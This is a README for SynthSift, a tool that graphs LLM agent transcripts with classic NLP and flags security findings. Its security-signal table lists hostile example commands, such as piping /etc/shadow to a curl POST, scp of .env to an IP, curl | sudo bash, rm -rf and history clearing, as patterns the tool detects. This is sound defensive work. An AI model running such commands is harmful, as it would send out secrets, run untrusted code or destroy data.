# SynthSift

**Turn LLM agent transcripts into an interactive knowledge + flow graph without using an LLM.**

SynthSift reads transcripts saved by agent harnesses, normalises them into one
model and runs classic NLP over every paragraph: spaCy NER and dependency
parsing, regular expressions, curated vocabularies and WordNet. It pulls out
people, places, files, IPs, hashes, ingredients, vehicles and so on, then draws
everything with networkx + vis-network (the engine behind pyvis). The graph
contains the conversation flow (user → LLM → tool call → result → …), every
tool call and its arguments, the agent's thoughts on a separate layer, and the
entities that tie conversations together. Clicking anything takes you to the
exact words in the transcript.

For security analysts it also flags **data leaving the host, downloads, exposed
secrets, sensitive-file access and destructive commands**, draws them as
`source → action → sink` chains (e.g. `/tmp/prod.sql.gz → s3://public-bucket`),
and lets you **tag and comment** on sessions, turns and terms. Two full-page
views sit next to the graph: **Nodes**, a sortable, filterable table of every
node, and **Timeline**, everything tagged plus the findings, row by row.

![Overview](docs/overview.jpg)

## Quick start

```bash
uv run synthsift --open                     # web UI on http://127.0.0.1:8765
uv run synthsift serve --load samples/synthsift-samples.zip --open
uv run synthsift build my-transcripts.zip -o graph.html   # standalone pyvis HTML, no server
uv run synthsift harnesses                  # list transcript parsers
```

`uv run` creates the environment on first use, including the small English
spaCy model. Uploads and settings are kept in `./.synthsift/` (`--data-dir` to
change).

### Upload layout

Upload one or more `.zip` files (button, or drag & drop anywhere):

```
upload.zip
└── <host>/
    └── <user>/
        └── <harness>/                 example | claude_code | gemini | antigravity | hermes | openclaw
            ├── transcript1-xyz.json
            └── transcript2-abc.jsonl
```

Extra wrapper folders above `host/` are ignored, and sub-folders below the
harness folder become part of the session name. When the harness folder isn't
recognised, each implemented parser gets to *sniff* the file instead. One file
is one session and may hold several conversations.

## Using the UI

The top bar switches between three pages: **Graph**, **Nodes** and **Timeline**.
They share the host / user / agent / conversation filters, the tag filter, *Hide
ignored*, and all tags and comments. A change on one page shows up at once on
the others, including in other tabs.

### Graph

| Where | What it does |
|---|---|
| **Graph** | Click a node to list every paragraph it appears in (or jump straight to it if there's only one). Hovering a node shows the paragraph with the word highlighted. Double-click zooms. |
| **Top search** | Searches words across all visible transcripts (plain text or `/regex/i`). Matching nodes get a halo, everything else fades, and the Matches tab lists the hits. Press <kbd>Enter</kbd> to zoom to them and <kbd>/</kbd> to focus the search box. |
| **Conversations panel** | **Host / user / agent filters** narrow the whole workspace (graph, transcript, findings, and the Nodes and Timeline pages). Below them, a tree of host › user › harness › conversation: checkboxes toggle visibility per conversation or per group. Its own search box counts matching paragraphs per conversation; the filter button shows only those conversations. Clicking a conversation opens its transcript and fits the graph to it. |
| **Transcript / Matches** | Shows the full conversation (user bubbles, italic dashed thoughts, tool-call cards with arguments, collapsible results) or the matching paragraphs. **# before / # after** set how many paragraphs of context surround each match. Underlined words are extracted entities; clicking one selects its node. |
| **Security tab** | Findings grouped by severity and category, each with its `source → action → sink` chain and where it happened. Click one to jump to the turn. **Flagged** (graph toolbar) fades everything without a finding; flagged nodes carry a severity ring and dataflow edges are drawn bold. |
| **Tagging** | Right-click a node, a transcript turn, an underlined term, a finding or a conversation in the tree to tag it **bad / suspicious / seen / ignore** or a custom tag, and to add a comment. The selection card has one-click tag checkboxes too. Tag chips in the left panel fade untagged nodes; *Hide ignored* removes `ignore`d items from the graph. |
| **Docking** | The panel docks right, left or bottom, or opens in its own window (the two windows stay in sync). |
| **Clustering** | *Cluster* in the graph toolbar collapses the graph into one node per **conversation, host, user or agent**; *auto* picks the first level with 2–40 groups once more than ~400 nodes are visible. Terms seen in more than one group stay outside the clusters, so you see what links sessions, hosts or users. **Click a cluster** to filter the workspace to it and expand it (in *auto* the next level then clusters, giving a drill-down); double-click expands it in place. Clusters show member count, highest finding severity and member tags. |
| **Layers chips** | Show or hide the *Thoughts*, *Dialogue*, *Actions* and *Entities* layers. |
| **Force / Layers** | *Force*: free physics. *Layers*: a swim-lane timeline with thoughts above the dialogue, tool calls and arguments below it, and entities at the bottom. Thoughts sit on their own band because they weren't acted on. |
| **Node types** | Legend and filter: click to toggle a type, shift-click to show only that type. |
| **Export** | Standalone **pyvis HTML** (works offline), **GraphML** (Gephi / yEd / Cytoscape) or a PNG of the current view. |
| **Open in Nodes** | The selection card's table button opens the selected node in the Nodes page. |
| **Settings** (⚙) | Knobs for extraction, text sources, custom vocabularies/patterns, graph content, edges, security analysis (including an analyst **watchlist** of your own patterns), physics, appearance, the transcript panel and every colour. Each setting shows whether changing it re-analyses the transcripts, rebuilds the graph, or applies instantly. |

![Selecting a node](docs/selection.jpg)
![Layers layout](docs/layers.jpg)
![Security findings with a dataflow chain](docs/security.jpg)
![Right-click tagging](docs/tagging.jpg)
![Clustered by conversation, with shared terms between clusters](docs/clusters.jpg)

### Nodes (`/nodes`)

Every node in one table: sessions, turns, tool calls and arguments, thoughts and
extracted terms.

- **Sort** by any column: name, type, findings (worst severity first), tags,
  layer, mentions, links, conversations, host / user, first seen or last seen.
  The *Columns* button hides or shows columns.
- **Filter**
  - The top search matches names, and the text of turns (`/regex/` supported).
  - The side rail filters by host, user, agent and conversation; tag chips
    and *Hide ignored*; tagged, untagged or commented; findings severity and
    category; layers; node types (shift-click for "only this type"); and a
    minimum mention count for terms.
- **Tag**
  - Right-click a row to tag it or comment on it.
  - Check rows (shift-click for a range, or use the header box for the whole
    page, then *Select all*) and use the bulk tag bar, or right-click the
    selection. Its chips show whether all, some or none of the rows carry
    each tag.
  - Tags a turn inherits from its session are drawn outlined.
- **Detail pane**: click a row to see its findings, tags and comment, linked
  nodes and every paragraph it appears in, with the word highlighted.
  Double-click, <kbd>Enter</kbd> or *Show in graph* reveals it in the graph,
  reusing an open graph tab.
- **Keys**: <kbd>↑</kbd>/<kbd>↓</kbd> (or <kbd>j</kbd>/<kbd>k</kbd>) move
  through the rows, <kbd>Space</kbd> checks one, <kbd>←</kbd>/<kbd>→</kbd>
  page, <kbd>/</kbd> searches.
- **CSV export** of the filtered rows.

![Nodes table with bulk tagging and the detail pane](docs/nodes.jpg)

### Timeline (`/timeline`)

Every tagged session, turn and term, plus the security findings, in time order,
row by row and grouped by day.

- **Filter** by row kind (sessions / turns / terms / findings), by the shared
  scope and tag filters, by comments only, by findings severity and category,
  and by date range. Sort oldest or newest first.
- **Tag** single rows or many at once, the same way as on the Nodes page.
- **Detail pane**: a finding's `source → action → sink` chain, the turn's tags
  and comment, and the turn in context, with adjustable **# before / # after**.
- **CSV export**, including the chain for each finding.

![Timeline of tagged rows and findings](docs/timeline.jpg)

## Security analysis

Signals are structural and deterministic (`nlp/security.py`). The code reasons about
where data moves rather than shipping a list of named tools:

| Signal | Example | Severity |
|---|---|---|
| **Outbound / exfiltration**: local data, a secret or bulk query output sent to a URL, domain, IP, host or bucket | `cat /etc/shadow \| curl -X POST --data-binary @- https://x.example`, `aws s3 cp dump.sql s3://…`, `scp .env ops@203.0.113.9:`, `pg_dump db \| curl -T - …` | high, or critical when a secret is involved |
| **Inbound download** to disk | `curl https://… -o /tmp/tool.sh` | medium |
| **Fetch-and-run** | `curl https://…/x.sh \| sudo bash` | high |
| **Exposed secret** in a message, argument or tool output (shown redacted) | private-key headers, cloud keys, tokens, `password=` | medium to critical |
| **Sensitive resource access** | `/etc/shadow`, `~/.ssh/id_rsa`, `.aws/credentials`, `.env` | high |
| **Destructive / data loss** | `rm -rf`, disk overwrite, `DROP TABLE`, recursive bucket delete, force push | medium to critical |
| **Log / history clearing** | `history -c`, truncating `/var/log/*` | high |
| **Watchlist** | your own patterns (Settings → Security analysis) | you choose |

Localhost, `/dev/null` and plain fetches without a write are ignored to keep
the noise down. Each finding records the conversation, turn and the entities
involved; chains become `dataflow` edges in the graph. The data-loss sample
(`ci-runner-3/jordan`) shows most of them.

Analyst tags and comments are stored in `annotations.json` in the data
directory (`GET/PUT/DELETE /api/annotations`, `POST/DELETE /api/tags`, JSON
export).

## How it works (no LLM anywhere)

```
zip ─► ingest ─► harness parser ─► normalized Conversation ─► segment ─► NLP ─► networkx graph ─► UI / pyvis
        (path → host/user/harness)    (models.py)              (events +    (per paragraph,
                                                                paragraphs)  cached)
```

1. **Harness parsers** (`src/synthsift/harnesses/`) turn each native format into
   pydantic models: `Conversation → Message(role) → Block(text | thinking | tool_call | tool_result)`.
2. **Segmentation** (`segment.py`) flattens a conversation into *events*: user
   turns, LLM replies, thoughts, individual tool calls and tool results. Each
   event is split into *paragraphs*, which are what the transcript panel shows
   and search highlights. Each tool argument gets its own paragraph, and fenced
   code is kept whole.
3. **Extraction** (`nlp/pipeline.py`). Earlier sources win when spans overlap:
   1. *Regex patterns*: URLs, e-mails, IPv4/6 (+port/CIDR), MACs, file paths
      (Unix, Windows, relative, bare filenames), domains, hashes, UUIDs, CVEs,
      AWS ARNs and regions, versions, dates, error types, env vars and
      constants, inline code, identifiers, @mentions, #tags, hex colours,
      coordinates, plus your own patterns.
   2. *Vocabularies*: your custom terms, then built-in lists (software and
      infrastructure, AI models, vehicle makes and models, cooking terms, …).
      Ambiguous words only match when capitalised ("Rust" the language, not
      rust on a wheel arch).
   3. *spaCy NER*: people, organisations, places, products, events, dates, money, …
   4. *Noun phrases* get a category from a WordNet hypernym lexicon shipped in
      the package (`garlic → food`, `sedan → vehicle`, `surgeon → role`,
      `torque wrench → tool`). Anything left over becomes a *concept*.
      Technical nouns ("client", "session", "fixture") are re-classed as
      software inside technical conversations.
   5. *Relations*: a dependency parse yields subject –verb→ object triples
      between entities. When the speaker acts ("read /etc/hosts"), the verb
      labels the message → entity edge.

   Tool results and code blocks get pattern-level analysis by default (fast,
   low noise). Settings can switch on full NLP for them.
4. **Graph** (`graph/builder.py`):

   | Node | Meaning | Layer |
   |---|---|---|
   | conversation, user, assistant (LLM), system | the dialogue | dialogue |
   | thought | a reasoning block | thought |
   | tool_call (one per call), tool_arg (one per argument), tool_result | actions | action |
   | entity (category = file_path, ip, person, food, vehicle, …) | extracted objects | entity, or *thought* when only ever mentioned while thinking |

   Edges: `flow` (conversation order), `thinks` / `leads_to` (thought → next
   action), `arg`, `returns`, `mention` (event → entity, labelled with the
   verb), `relation` (entity → entity, verb label), `alias` (path variants of
   one file), and optional `cooccurs` and tool hubs.
   Entities are shared across conversations by default, which is what links
   separate sessions together.

## Adding a harness

Create `src/synthsift/harnesses/<name>.py`. Every module in that package is
imported automatically:

```python
from ..models import Block, Conversation, Message
from .base import HarnessParser, register


@register
class MyAgentParser(HarnessParser):
    name = "myagent"                 # zip folder name
    aliases = ("my-agent",)
    label = "My Agent"

    def parse(self, raw: bytes, filename: str) -> list[Conversation]:
        rows = self.load_jsonl(raw)
        msgs = []
        for r in rows:
            if r["kind"] == "prompt":
                msgs.append(Message("user", [Block.text_block(r["text"])]))
            elif r["kind"] == "step":
                msgs.append(Message("assistant", [
                    Block.thinking(r.get("plan", "")),
                    Block.tool_call(r["tool"], r["args"], r["id"]),
                ]))
            elif r["kind"] == "observation":
                msgs.append(Message("tool", [Block.tool_result(r["output"], r["id"])]))
        return [Conversation(messages=msgs)]

    def sniff(self, raw: bytes, filename: str) -> float:   # optional
        return 0.9 if b'"kind": "prompt"' in raw[:2000] else 0.0
```

`example.py` is the complete reference implementation. It also reads OpenAI
chat-completions logs and Anthropic Messages logs, so it's a good base to copy.
`claude_code.py`, `gemini.py`, `antigravity.py`, `hermes.py` and `openclaw.py`
are registered placeholders: files in those folders are skipped with a
warning until the parser is written. Each one's docstring has notes on the
native format.

### The example format

```json
{
  "format": "synthsift.example/v1",
  "title": "Optional title",
  "messages": [
    {"role": "user", "content": "Read /etc/hosts please"},
    {"role": "assistant", "content": [
      {"type": "thinking", "text": "I should use read_file."},
      {"type": "tool_call", "id": "c1", "name": "read_file", "arguments": {"path": "/etc/hosts"}}
    ]},
    {"role": "tool", "tool_call_id": "c1", "content": "127.0.0.1 localhost"},
    {"role": "assistant", "content": "It maps localhost to 127.0.0.1."}
  ]
}
```

Also accepted: `{"conversations": [...]}`, a bare list of messages, and JSONL.
See `samples/transcripts/` for complete examples.

## Better entity recognition

The bundled `en_core_web_sm` model is fast but makes mistakes. Install a larger
model and select it under Settings → Extraction → spaCy model:

```bash
uv pip install https://github.com/explosion/spacy-models/releases/download/en_core_web_md-3.8.0/en_core_web_md-3.8.0-py3-none-any.whl
# or en_core_web_lg / en_core_web_trf
```

## Development

```bash
uv run pytest                                  # tests
uv run python scripts/generate_samples.py      # rebuild samples/ (short + very long fake transcripts)
uv run python scripts/build_lexicon.py         # rebuild the WordNet category lexicon
uv run python scripts/update_icon_font.py      # re-subset Material Symbols after adding icons to the UI
```

The front end is plain HTML/CSS/JS in `src/synthsift/static/`, with no build
step. Fonts (Roboto, Roboto Mono, Material Symbols) and vis-network are served
locally, so the app works offline.

## Credits & licences

* WordNet 3.0 © Princeton University. The category lexicon in
  `src/synthsift/nlp/data/` is derived from it (see `WORDNET_LICENSE.txt`).
* Roboto and Roboto Mono (SIL OFL 1.1), Material Symbols (Apache 2.0), vendored
  from Google Fonts.
* vis-network is served from the pyvis package.
